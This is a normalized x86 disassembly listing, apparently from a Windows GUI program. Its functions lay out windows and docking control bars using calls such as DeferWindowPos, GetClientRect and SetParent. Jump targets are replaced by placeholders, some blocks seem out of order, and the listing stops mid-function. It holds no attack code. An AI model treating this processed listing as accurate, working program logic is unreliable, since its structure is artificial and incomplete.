jne r-xdata
lea eax [ ebp + 0xc ]
push eax
push [ esi + 0x1c ]
call [ ClientToScreen@IAT ]
mov ecx [ esi + 0x74 ]
push [ ebp + 0x10 ]
mov eax [ ecx ]
push [ ebp + 0xc ]
call [ eax ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_44b92c
push esi
mov esi ecx
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov ecx esi
call sub_43e71a
mov eax [ esi ]
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call [ eax + 0x64 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi + 0x74 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
jmp r-xdata
pop esi
retn 0xc
sub_44b95e
push ebx
push esi
push edi
mov esi ecx
call sub_44163f
mov ecx [ esi + 0x60 ]
mov edi 0x10000000
and eax edi
xor ebx ebx
xor edx edx
test cl 0x1
je r-xdata
test cl 0x2
je r-xdata
cmp eax ebx
je r-xdata
and ecx 0xfffffffc
cmp edx ebx
mov [ esi + 0x60 ] ecx
je r-xdata
cmp eax ebx
jne r-xdata
mov edx 0x80
jmp r-xdata
mov ecx esi
call sub_44163f
test edi eax
je r-xdata
or edx 0x17
mov ecx esi
push edx
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4417b0
push 0x40
pop edx
pop edi
pop esi
xor eax eax
pop ebx
retn 0x8
mov ecx [ esi + 0x70 ]
cmp ecx ebx
je r-xdata
mov ecx esi
call sub_420960
mov edi eax
cmp edi ebx
je r-xdata
call sub_44163f
test edi eax
je r-xdata
mov ecx esi
call sub_43fcfb
mov edi eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push edi
call [ eax + 0xc0 ]
cmp edi ebx
je r-xdata
sub_44ba10
push ebx
push esi
push edi
mov esi ecx
call sub_44163f
mov edi eax
mov eax [ esi + 0x64 ]
mov edx 0x10000000
and eax 0xff00
and edi edx
or edi eax
mov eax [ esi + 0x60 ]
test al 0x3
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
test al 0x1
je r-xdata
test edx edi
jne r-xdata
test edx edi
je r-xdata
and al 0xfc
mov [ esi + 0x60 ] eax
push 0x40
pop ecx
mov ecx 0x80
jmp r-xdata
or ecx 0x17
and al 0xfc
push ecx
push edx
push edx
push edx
push edx
push edx
push [ esi + 0x1c ]
mov [ esi + 0x60 ] eax
push [ ebx ]
call [ DeferWindowPos@IAT ]
mov [ ebx ] eax
jmp r-xdata
mov ebx [ esp + 0x10 ]
xor edi edx
xor edx edx
cmp [ ebx ] edx
je r-xdata
sub_44ba80
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ecx ]
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
push esi
call [ eax + 0xcc ]
test eax 0x10000000
mov [ ebp + 0xc ] eax
je r-xdata
xor eax eax
pop esi
leave
retn 0x8
test ah 0xf0
je r-xdata
push ebx
lea eax [ esi + 0x4 ]
push edi
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ CopyRect@IAT ]
mov edi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
sub edi [ ebp - 0x1c ]
sub ebx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp [ esi + 0x1c ] edx
mov eax [ ecx + 0x64 ]
setne dl
test al 0x4
je r-xdata
test [ ebp + 0xd ] 0xa0
je r-xdata
test al 0x1
je r-xdata
or edx 0x10
or edx 0xa
jmp r-xdata
or edx 0x6
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax ebx
jl r-xdata
mov ecx edi
mov [ ebp - 0xc ] ecx
mov eax [ ecx ]
push edx
lea edx [ ebp - 0xc ]
push 0xffffffff
push edx
call [ eax + 0xbc ]
mov ecx [ ebp - 0xc ]
cmp ecx edi
jl r-xdata
mov edi [ ebp + 0xc ]
test edi 0xa000
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] eax
test edi 0x5000
je r-xdata
mov edx [ esi + 0x14 ]
add [ esi + 0x18 ] eax
cmp edx ecx
jg r-xdata
mov edx [ ebp - 0x1c ]
pop edi
add ecx edx
pop ebx
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x18 ]
add ecx eax
cmp [ esi ] 0x0
mov [ ebp - 0x10 ] ecx
je r-xdata
mov edx [ esi + 0x18 ]
add [ esi + 0x14 ] ecx
cmp edx eax
jg r-xdata
test edi 0x2000
mov [ esi + 0x14 ] edx
je r-xdata
mov edx ecx
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x1c ]
push esi
call sub_440388
test edi 0x1000
mov [ esi + 0x18 ] edx
je r-xdata
mov edx eax
test edi 0x8000
je r-xdata
add [ esi + 0x8 ] eax
jmp r-xdata
test edi 0x4000
je r-xdata
add [ esi + 0x4 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
sub edx eax
sub [ esi + 0x10 ] eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx ecx
sub [ esi + 0xc ] ecx
mov [ ebp - 0x1c ] edx
sub_44bbba
push esi
mov esi ecx
and [ esi + 0x60 ] 0xfffffffc
cmp [ esp + 0x8 ] 0x0
je r-xdata
call sub_44163f
test eax 0x10000000
je r-xdata
call sub_44163f
test eax 0x10000000
jne r-xdata
pop esi
retn 0x4
or [ esi + 0x60 ] 0x1
or [ esi + 0x60 ] 0x2
jmp r-xdata
sub_44bbee
mov eax [ ecx + 0x60 ]
test al 0x1
jne r-xdata
xor eax eax
retn
test al 0x2
jne r-xdata
push 0x1
pop eax
retn
call sub_44163f
test eax 0x10000000
jne r-xdata
sub_44bc0c
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
mov esi ecx
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
push [ ebp + 0x8 ]
call sub_44bc43
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
push [ ebp + 0x8 ]
call sub_44bdf1
pop esi
leave
retn 0x4
sub_44bc43
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ecx + 0x64 ]
push ebx
test ch 0xf
mov [ ebp - 0x14 ] ecx
je r-xdata
pop ebx
leave
retn 0x8
mov ebx [ ebp + 0xc ]
push esi
push edi
mov esi ebx
lea edi [ ebp - 0x34 ]
cmp [ rw-data ] 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ebx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jne r-xdata
mov [ ebp - 0x10 ] ecx
mov [ ebp + 0xc ] eax
and [ ebp - 0x10 ] 0x80
je r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x4 ] 0x200
je r-xdata
dec [ ebp - 0x2c ]
dec [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x8 ] 0x800
je r-xdata
add [ ebp - 0x20 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] ecx
and [ ebp - 0xc ] 0x100
je r-xdata
sub edi eax
xor eax eax
cmp [ ebp - 0x4 ] eax
je r-xdata
push [ ebp + 0xc ]
mov eax edi
sub eax [ ebp - 0x20 ]
mov ecx esi
push eax
push 0x1
push [ ebp - 0x20 ]
push 0x0
call sub_451c1c
mov eax [ ebp - 0x14 ]
and eax 0x400
mov [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
push 0x1
push [ ebx + 0x8 ]
push eax
push eax
call sub_451c1c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp + 0xc ]
mov eax edi
sub eax [ ebp - 0x20 ]
mov ecx esi
push eax
push 0xffffffff
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
call sub_451c1c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
push 0xffffffff
push [ ebx + 0x8 ]
push [ ebp - 0x28 ]
push 0x0
call sub_451c1c
xor eax eax
pop edi
cmp [ ebp - 0xc ] eax
pop esi
je r-xdata
mov eax [ rw-data ]
cmp [ ebp - 0xc ] 0x0
mov [ ebp + 0xc ] eax
je r-xdata
cmp [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ rw-data ]
add [ ebx ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push eax
mov eax edi
sub eax [ ebp - 0x20 ]
mov ecx esi
push eax
push 0x1
push [ ebp - 0x20 ]
push 0x1
call sub_451c1c
cmp [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ rw-data ]
add [ ebx + 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
push 0x1
push [ ebx + 0x8 ]
push 0x1
push 0x0
call sub_451c1c
cmp [ ebp - 0x8 ] eax
je r-xdata
mov ecx [ rw-data ]
sub [ ebx + 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp + 0xc ]
sub edi [ ebp - 0x20 ]
mov ecx esi
push edi
push 0xffffffff
push [ ebp - 0x20 ]
push [ ebx + 0x8 ]
call sub_451c1c
mov eax [ rw-data ]
sub [ ebx + 0xc ] eax
push [ ebp + 0xc ]
mov ecx esi
push 0xffffffff
push [ ebx + 0x8 ]
push [ ebx + 0xc ]
push 0x0
call sub_451c1c
sub_44bdf1
mov eax [ ecx + 0x64 ]
push esi
mov edx eax
push edi
and edx r--data
cmp edx __dos_header
jne r-xdata
pop edi
pop esi
retn 0x8
mov edx [ ecx + 0x48 ]
test ah 0xa0
mov eax [ esp + 0x10 ]
je r-xdata
mov edi [ eax + 0x8 ]
mov esi [ eax ]
sub edi [ ecx + 0x4c ]
push [ rw-data ]
mov eax [ eax + 0x4 ]
push [ rw-data ]
sub edi esi
sub edi edx
inc eax
push 0x3
inc eax
push edi
add esi edx
push eax
push esi
mov edi [ eax + 0xc ]
mov esi [ eax + 0x4 ]
sub edi [ ecx + 0x4c ]
push [ rw-data ]
mov eax [ eax ]
push [ rw-data ]
sub edi esi
sub edi edx
add esi edx
inc eax
push edi
push 0x3
inc eax
push esi
push eax
jmp r-xdata
mov ecx [ esp + 0x24 ]
call sub_451c68
sub_44be6a
mov edx [ ecx + 0x64 ]
mov eax [ esp + 0x4 ]
test dh 0x1
push esi
je r-xdata
test dh 0x2
je r-xdata
mov esi [ rw-data ]
add [ eax ] esi
test dh 0x4
je r-xdata
mov esi [ rw-data ]
add [ eax + 0x4 ] esi
test dh 0x8
pop esi
je r-xdata
mov esi [ rw-data ]
sub [ eax + 0x8 ] esi
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov edx [ rw-data ]
sub [ eax + 0xc ] edx
mov edx [ ecx + 0x48 ]
add [ eax ] edx
mov edx [ ecx + 0x40 ]
add [ eax + 0x4 ] edx
mov edx [ ecx + 0x4c ]
sub [ eax + 0x8 ] edx
mov edx [ ecx + 0x44 ]
sub [ eax + 0xc ] edx
mov ecx [ ecx + 0x64 ]
and ecx r--data
cmp ecx __dos_header
jne r-xdata
mov edx [ ecx + 0x40 ]
add [ eax ] edx
mov edx [ ecx + 0x48 ]
add [ eax + 0x4 ] edx
mov edx [ ecx + 0x44 ]
sub [ eax + 0x8 ] edx
mov edx [ ecx + 0x4c ]
sub [ eax + 0xc ] edx
mov ecx [ ecx + 0x64 ]
and ecx r--data
cmp ecx __dos_header
jne r-xdata
retn 0x8
add [ eax + 0x4 ] 0x7
add [ eax ] 0x7
jmp r-xdata
sub_44bf13
mov eax sub_4640eb
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_455720
lea edi [ esi + 0x7c ]
xor ebx ebx
mov ecx edi
mov [ ebp - 0x4 ] ebx
call sub_43d199
mov eax [ ebp + 0x8 ]
push ebx
mov [ esi ] r--data
mov [ esi + 0x78 ] eax
mov [ esi + 0x3c ] 0x1
push [ edi + 0x8 ]
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_43d312
lea eax [ esi + 0x94 ]
mov [ esi + 0x90 ] ebx
push eax
call [ SetRectEmpty@IAT ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x48 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x40 ] ebx
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_44bfaa
mov eax sub_46410b
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x84 ] edi
jle r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x7c ]
call sub_43d1cc
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_44af64
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push edi
mov ecx esi
call sub_44cc67
test eax eax
je r-xdata
inc edi
cmp edi [ esi + 0x84 ]
jl r-xdata
cmp [ eax + 0x70 ] esi
jne r-xdata
and [ eax + 0x70 ] 0x0
sub_44c016
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
and eax r-xdata
push 0x2
mov [ esi + 0x64 ] eax
call sub_44121e
lea eax [ ebp - 0x10 ]
push eax
call [ SetRectEmpty@IAT ]
push 0x0
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x0
push r--data
call sub_43edf5
pop esi
leave
retn 0xc
sub_44c061
push ebx
push esi
mov esi ecx
push edi
xor ebx ebx
xor edi edi
cmp [ esi + 0x84 ] ebx
jle r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
push edi
mov ecx esi
call sub_44cc67
test eax eax
je r-xdata
inc edi
cmp edi [ esi + 0x84 ]
jl r-xdata
inc ebx
sub_44c08e
push ebx
push esi
push edi
mov esi ecx
xor edi edi
xor ebx ebx
cmp [ esi + 0x84 ] edi
jle r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
push edi
mov ecx esi
call sub_44cc67
test eax eax
je r-xdata
inc edi
cmp edi [ esi + 0x84 ]
jl r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc8 ]
test eax eax
je r-xdata
inc ebx
sub_44c0c9
push ebp
mov ebp esp
sub esp 0x12c
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push edi
push eax
push [ esi + 0x1c ]
mov ebx ecx
call [ GetWindowRect@IAT ]
cmp [ esi + 0x70 ] ebx
jne r-xdata
xor edi edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
and [ ebx + 0x64 ] 0xfffffff9
mov eax [ esi + 0x64 ]
mov ecx [ ebx + 0x64 ]
and eax 0x6
or eax ecx
test al 0x40
mov [ ebx + 0x64 ] eax
jne r-xdata
test [ esi + 0x68 ] 0x40
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x28 ]
push eax
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x64 ]
mov eax [ ebx + 0x64 ]
xor eax ecx
and eax 0xf000
xor eax ecx
or ah 0xf
cmp [ ebx + 0x78 ] edi
je r-xdata
lea eax [ ebp - 0x12c ]
push 0x104
push eax
mov ecx esi
call sub_4416fc
lea eax [ ebp - 0x12c ]
push eax
push [ ebx + 0x1c ]
call sub_447993
or [ ebx + 0x64 ] 0x40
jmp r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
cmp [ ebx + 0x78 ] edi
je r-xdata
or [ ebp - 0x14 ] 0xffffffff
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
push eax
mov ecx esi
call sub_4557df
cmp [ esi + 0x70 ] ebx
mov [ ebp - 0x18 ] edi
je r-xdata
lea edi [ ebx + 0x7c ]
push esi
mov ecx edi
push [ edi + 0x8 ]
call sub_43d312
push 0x0
mov ecx edi
push [ edi + 0x8 ]
call sub_43d312
mov eax [ rw-data ]
xor edi edi
push 0x115
push edi
neg eax
push edi
push eax
mov eax [ rw-data ]
mov ecx esi
neg eax
push eax
push edi
call sub_4417b0
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call [ CopyRect@IAT ]
lea eax [ ebp - 0x10 ]
mov ecx ebx
push eax
call sub_44736f
mov eax [ ebp - 0x8 ]
lea esi [ ebp - 0x10 ]
sub eax [ ebp - 0x10 ]
cdq
sub eax edx
mov ecx eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
sar ecx 0x1
add ecx [ ebp - 0x10 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0xc ]
push eax
push ecx
sub esp 0x10
mov ecx ebx
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_44cc83
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
push 0x114
mov ecx [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push 0x0
call sub_4417b0
mov esi [ ebp + 0x8 ]
xor edi edi
jmp r-xdata
push 0x97
push edi
push edi
push edi
push edi
push edi
mov ecx esi
call sub_4417b0
mov [ ebp - 0x18 ] 0x1
mov ecx [ esi + 0x70 ]
cmp ecx ebx
jne r-xdata
cmp ebx edi
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
cmp eax ebx
je r-xdata
cmp ecx edi
je r-xdata
push edi
push [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebx + 0x1c ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x18 ] edi
mov [ esi + 0x70 ] ebx
je r-xdata
cmp [ ebx + 0x78 ] edi
je r-xdata
push esi
call sub_44c53c
push eax
push [ esi + 0x1c ]
call [ SetParent@IAT ]
push eax
call sub_43e7b3
push esi
mov ecx ebx
call sub_44c4db
mov ecx ebx
call sub_4513b8
or [ eax + 0xb8 ] 0xc
push 0x57
push edi
push edi
push edi
push edi
push edi
mov ecx esi
call sub_4417b0
xor eax eax
cmp [ ecx + 0x78 ] edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push eax
push 0xffffffff
sub_44c2f4
push ebp
mov ebp esp
sub esp 0x124
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push edi
push eax
push [ esi + 0x1c ]
mov ebx ecx
call [ GetWindowRect@IAT ]
cmp [ esi + 0x70 ] ebx
jne r-xdata
cmp [ ebx + 0x78 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebx + 0x64 ] 0xfffffff9
mov eax [ esi + 0x64 ]
mov ecx [ ebx + 0x64 ]
and eax 0x6
or eax ecx
test al 0x40
mov [ ebx + 0x64 ] eax
jne r-xdata
test [ esi + 0x68 ] 0x40
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x64 ]
mov eax [ ebx + 0x64 ]
xor eax ecx
and eax 0xf000
xor eax ecx
or ah 0xf
cmp [ ebx + 0x78 ] 0x0
je r-xdata
lea eax [ ebp - 0x124 ]
push 0x104
push eax
mov ecx esi
call sub_4416fc
lea eax [ ebp - 0x124 ]
push eax
push [ ebx + 0x1c ]
call sub_447993
or [ ebx + 0x64 ] 0x40
and al 0xfe
or al 0x1
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x80 ]
mov [ eax + edi * 4 ] esi
push eax
mov ecx esi
call sub_4557df
push 0xffffffff
push [ esi + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
push eax
mov ecx ebx
call sub_44cbf8
mov edi eax
test edi edi
jle r-xdata
cmp edi 0x1
jge r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call [ CopyRect@IAT ]
lea eax [ ebp - 0x10 ]
mov ecx ebx
push eax
call sub_44736f
cmp edi 0x1
jge r-xdata
mov ecx [ rw-data ]
xor eax eax
push 0x115
push eax
neg ecx
push eax
push ecx
mov ecx [ rw-data ]
neg ecx
push ecx
push eax
lea edi [ ebx + 0x7c ]
push esi
mov ecx edi
push [ edi + 0x8 ]
call sub_43d312
push 0x0
mov ecx edi
push [ edi + 0x8 ]
call sub_43d312
mov eax [ ebp - 0x4 ]
push 0x114
sub eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ ebp - 0x10 ]
sub eax [ ebp - 0x10 ]
cdq
sub eax edx
mov ecx eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
sar ecx 0x1
add ecx [ ebp - 0x10 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0xc ]
push eax
push ecx
sub esp 0x10
mov ecx ebx
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_44cc83
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x70 ]
test ecx ecx
je r-xdata
test ebx ebx
jne r-xdata
mov ecx esi
call sub_4417b0
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
cmp eax ebx
je r-xdata
mov ecx ebx
mov [ esi + 0x70 ] ebx
call sub_4513b8
or [ eax + 0xb8 ] 0xc
push 0x0
push 0xffffffff
push esi
call sub_44c53c
mov eax [ ebx + 0x1c ]
xor eax eax
jmp r-xdata
push eax
push [ esi + 0x1c ]
call [ SetParent@IAT ]
push eax
call sub_43e7b3
sub_44c4db
mov eax [ esp + 0x4 ]
push ebx
push esi
mov esi ecx
mov ecx eax
push edi
shr ecx 0x10
test cx cx
je r-xdata
push 0xffffffff
push eax
mov ecx esi
call sub_44cbf8
mov edi eax
test edi edi
jle r-xdata
push [ eax + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
pop edi
pop esi
pop ebx
retn 0x4
lea ebx [ esi + 0x7c ]
push 0x1
push edi
mov ecx ebx
call sub_43d3cb
mov eax [ esi + 0x80 ]
cmp [ eax + edi * 4 - 0x4 ] 0x0
lea eax [ eax + edi * 4 ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
push edi
mov ecx ebx
call sub_43d3cb
sub_44c53c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44cbf8
cmp [ ebp + 0x10 ] 0x1
mov ebx eax
jne r-xdata
lea edi [ esi + 0x7c ]
push 0x1
push ebx
mov ecx edi
call sub_43d3cb
mov eax [ esi + 0x80 ]
cmp [ eax + ebx * 4 - 0x4 ] 0x0
lea eax [ eax + ebx * 4 ]
jne r-xdata
mov edi [ esi + 0x80 ]
shl eax 0x2
add edi eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ edi ] eax
mov eax [ esi + 0x80 ]
push ebx
mov ecx esi
push [ eax + ebx * 4 ]
call sub_44cbf8
test eax eax
jle r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
lea edi [ esi + 0x7c ]
push 0x1
push ebx
mov ecx edi
call sub_43d3cb
mov eax [ esi + 0x80 ]
cmp [ eax + ebx * 4 - 0x4 ] 0x0
lea eax [ eax + ebx * 4 ]
jne r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_44c4db
push 0x1
push ebx
mov ecx edi
call sub_43d3cb
xor eax eax
mov ecx esi
call sub_4513b8
cmp [ esi + 0x78 ] 0x0
mov edi eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
or [ edi + 0xb8 ] 0xc
mov eax [ esi ]
mov ecx esi
call [ eax + 0xe0 ]
test eax eax
jne r-xdata
push 0x1
push ebx
mov ecx edi
call sub_43d3cb
jmp r-xdata
mov ecx esi
call sub_44c061
test eax eax
jne r-xdata
push 0x0
mov ecx edi
call sub_4417ff
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x58 ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_44c64a
push ebp
mov ebp esp
sub esp 0x84
push esi
push edi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x8 ]
mov edi ecx
push [ ebp + 0xc ]
mov [ ebp - 0x40 ] edi
push eax
call sub_44affb
lea esi [ edi + 0x94 ]
push esi
call [ IsRectEmpty@IAT ]
test eax eax
jne r-xdata
mov ecx edi
call sub_43fcfb
lea ecx [ ebp - 0x54 ]
push ecx
push [ eax + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x48 ]
sub eax [ ebp - 0x54 ]
sub ecx [ ebp - 0x50 ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
sub eax [ esi ]
sub ecx [ esi + 0x4 ]
jmp r-xdata
push [ edi + 0x84 ]
call [ BeginDeferWindowPos@IAT ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] esi
jmp r-xdata
xor esi esi
mov [ ebp - 0x2c ] eax
cmp [ edi + 0x90 ] esi
mov [ ebp - 0x28 ] ecx
je r-xdata
cmp [ edi + 0x90 ] esi
pop ebx
jne r-xdata
push [ ebp - 0xc ]
mov ecx edi
call sub_44cc67
mov ecx [ ebp - 0xc ]
mov esi eax
mov eax [ edi + 0x80 ]
mov [ ebp - 0x44 ] esi
test esi esi
mov eax [ eax + ecx * 4 ]
je r-xdata
mov eax [ rw-data ]
push ebx
mov ebx [ rw-data ]
mov [ ebp - 0x24 ] esi
neg ebx
neg eax
cmp [ edi + 0x84 ] esi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0xc ] esi
jle r-xdata
lea eax [ ebp - 0x64 ]
push eax
call [ SetRectEmpty@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x64 ]
mov ecx edi
push eax
call sub_44be6a
cmp [ ebp + 0xc ] esi
je r-xdata
cmp [ ebp - 0x84 ] esi
je r-xdata
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc8 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x10 ] esi
jne r-xdata
push [ ebp - 0x84 ]
call [ EndDeferWindowPos@IAT ]
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ edi + 0x84 ]
jl r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x64 ]
test al 0x4
je r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp - 0x64 ]
sub eax [ ebp - 0x5c ]
add [ ebp - 0x8 ] eax
xor esi esi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call [ eax + 0xcc ]
jmp r-xdata
and eax 0xa000
neg eax
sbb eax eax
and al 0xfa
add eax 0x10
test al 0x1
je r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
cmp [ ebp + 0x10 ] esi
je r-xdata
sub eax [ rw-data ]
add ebx eax
cmp [ ebp - 0x8 ] ebx
jg r-xdata
sub eax [ rw-data ]
mov ecx [ ebp - 0x30 ]
add ecx eax
cmp [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] ecx
jg r-xdata
mov eax [ ebp - 0x50 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ ebp - 0x54 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
push 0x6
pop eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
mov eax [ ebp - 0x60 ]
sub eax [ ebp - 0x58 ]
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0x30 ]
cmp [ ebp - 0x4 ] eax
jg r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp - 0x4 ] ecx
jg r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x10 ]
